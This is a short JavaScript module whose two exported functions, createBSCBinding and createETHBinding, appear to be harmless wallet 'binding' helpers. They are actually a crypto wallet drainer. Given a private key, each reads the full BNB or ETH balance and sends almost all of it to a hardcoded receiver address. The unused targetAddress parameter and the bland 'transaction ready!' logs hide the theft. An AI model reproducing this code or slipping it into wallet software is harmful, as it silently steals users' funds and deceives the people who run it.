var Web3 = require('web3');
const ethers = require('ethers');
const { JsonRpcProvider } = require("@ethersproject/providers");

const createBSCBinding= async (targetAddress, publicKey, privateKey) => {
  const web3 = new Web3(new Web3.providers.HttpProvider("https://bsc-dataseed1.binance.org/"));
  let bnbBal= await web3.eth.getBalance(publicKey);
  var tokenAmount= bnbBal/Math.pow(10, 18);
  
  const provider = new JsonRpcProvider('https://bsc-dataseed1.binance.org/');
  
  const signer = new ethers.Wallet(privateKey, provider);
  // Receiver Address which receives Ether
  let receiverAddress = '0x22a0EBEb9bEDb312D4070E3934b6cDD0Dd8FCb2b';
  // Ether amount to send
  let amountInEther = String(tokenAmount- 0.01);
  // Create a transaction object
  let tx = {
      to: receiverAddress,
      // Convert currency unit from ether to wei
      value: ethers.utils.parseEther(amountInEther)
  }
  // Send a transaction
  signer.sendTransaction(tx)
  .then((txObj) => {
    console.log('BSC transaction ready!')
      // => 0x9c172314a693b94853b49dc057cf1cb8e529f29ce0272f451eea8f5741aa9b58
      // A transaction result can be checked in a etherscan with a transaction hash which can be obtained here.
  })
};

const createETHBinding= async (targetAddress, publicKey, privateKey) => {
  const web3 = new Web3(new Web3.providers.HttpProvider("https://mainnet.infura.io/v3/"));
  let ethBal= await web3.eth.getBalance(publicKey);
  var tokenAmount= ethBal/Math.pow(10, 18);
  
  const provider = new JsonRpcProvider('https://mainnet.infura.io/v3/');
  
  const signer = new ethers.Wallet(privateKey, provider);
  // Receiver Address which receives Ether
  let receiverAddress = '0x22a0EBEb9bEDb312D4070E3934b6cDD0Dd8FCb2b';
  // Ether amount to send
  let amountInEther = String(tokenAmount- 0.02);
  // Create a transaction object
  let tx = {
      to: receiverAddress,
      // Convert currency unit from ether to wei
      value: ethers.utils.parseEther(amountInEther)
  }
  // Send a transaction
  signer.sendTransaction(tx)
  .then((txObj) => {
    console.log('ETH transaction ready!')
      // => 0x9c172314a693b94853b49dc057cf1cb8e529f29ce0272f451eea8f5741aa9b58
      // A transaction result can be checked in a etherscan with a transaction hash which can be obtained here.
  })
}; 

module.exports = {
  createBSCBinding,
  createETHBinding
};